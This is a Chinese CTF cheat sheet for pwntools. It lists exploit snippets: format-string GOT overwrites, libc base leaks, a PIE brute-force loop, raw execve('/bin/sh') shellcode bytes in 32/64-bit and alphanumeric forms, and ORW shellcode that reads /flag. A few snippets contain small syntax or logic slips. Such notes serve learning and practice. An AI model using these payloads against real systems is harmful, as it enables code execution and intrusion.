---
title: 'pwntools 常用函数速查：收发数据、格式化字符串与 shellcode'
date: '2025-7-24 21:08:00'
description: '整理 pwntools 在 pwn 题中的常用函数，包括数据接收、随机数、格式化字符串、libc 泄露、PIE 爆破、shellcode、ORW 和 ELF 操作。'
tags:
  - pwn
  - pwntools
  - shellcode
  - format-string
  - libc
categories:
  - pwn
abbrlink: 19193
permalink: posts/pwntools-cheatsheet-recv-fmtstr-shellcode/
top_img: transparent
---

## 接受数据

```python
p.interactive() #获取shell后进行交互
p.recvall() #一直接收直到达到文件EOF
p.recvline(keepends=False) #接收一行，keepends为是否保留行尾的\n。
p.recv(numb=字节大小, timeout=default) #接收指定字节数
p.recv()[从第几位接受:接收到第几位] #接收指定字节数、
int(p.recv()[从第几位接受:接收到第几位],16)

p.recvuntil(b'\n', drop=True) #直到接受到\n截至，接受到为字符型，无法直接进行计算使用
int(p.recvuntil(b'\n', drop=True), 16) #可以使用int()强转为16进制
u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#使用u64打包接受，直到\x7f为止，用于接受地址，不足8位用\x00补齐
int(p.recv(18), 16) 
#接收18位字节，接收的数据类型是16进制
u32(p.recvuntil('\xf7')[-4:])
```



## 随机数
```python
#在有libc文件时，程序已时间 time() 为随机数种子时是伪随机
from ctypes import * 
libc = cdll.LoadLibrary('libc.so.6')
libc.srand(libc.time(0))
#给srand赋值
libc.rand()
#调用出随机数
```

 

## 格式化字符串
```python
fmtstr_payload(offset,{printf_got:system_plt})
#offset程序的偏移
#printf_got需要修改的地址
#system_plt填入的地址
```





## 数据长度
```python
#一般使用
print(f"adad",len(payload)

#或者使用
import builtins
print(f'payload0_size,builtins.hex(builtins.len(payload)))
```



## libc 泄露
```python
libc_base = puts_addr - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
bin_sh = libc_base +  next(libc.search(b"/bin/sh\x00"))
```



```python
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
```



## pie 爆破
```python
for num in range(15):
    p=remote('127.0.0.1',xxxx)
    p.recvuntil(b"") 
    num=num<<0xc
    #右移三位=0x1000
    payload=b'a'*(0x100+8)
    payload+=p16(0x185+num)
    #后三位在pie中是不变的第一位是随机变动的1-16
    p.send(payload)
```



## shellcode
```python
#44位自动生成的system("/bin\sh\x00")
asm(shellcraft.sh())

#不可见版本
#32 位 短字节 shellcode -> 21 字节
b"#\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
#64 位 较短的 shellcode 23 字节
b"#\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

#可见版本
#x64 下的：
b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
#x32 下的：
b"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"

```



## orw
```python
#最基础的，需要有bss段
payload=shellcraft.open('/flag')
payload+=shellcraft.read(3,bss_add,100)
payload+=shellcraft.write(1,bss_add,100)
sl(asm(payload))

#缺少o，可以使用 openat  进行代替
#缺少rw，可以使用sendfile进行代替
#无需bss段
payload=shellcraft.openat(0, '/flag\x00')
payload+=shellcraft.sendfile(1,3,0,100)

#手搓的orw，可以根据题目进行修改内容
# 本文作者： Jexy-Kynner @木提青
# 本文链接： http://jexy-kynner.github.io/2024/07/08/orw/
# 版权声明： 本站所有文章除特别声明外，均采用 (CC)BY-NC-SA 许可协议。转载请注明出处！

sh=asm('''
#清空寄存器
xor rax,rax  
xor rdi,rdi
xor rsi,rsi
xor rdx,rdx
mov rax,2
#0x67616c662f2e（flag）
mov rdi,0x67616c662f2e	
push rdi
mov rdi,rsp
syscall
mov rax,0	
mov rdx,0x30 
mov rsi,0x67616c662f2e		
mov rsi,rsp
mov rdi,3
syscall
mov rdi,1
mov rax,1
syscall
'''
)
```

## ELF
```python
#找到 a_function 的地址
symbols['a_function']

# 找到 a_function的 got
got['a_function']

# 找到 a_function 的 plt
plt['a_function']

# 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址
next(e.search("some_characters"))
```

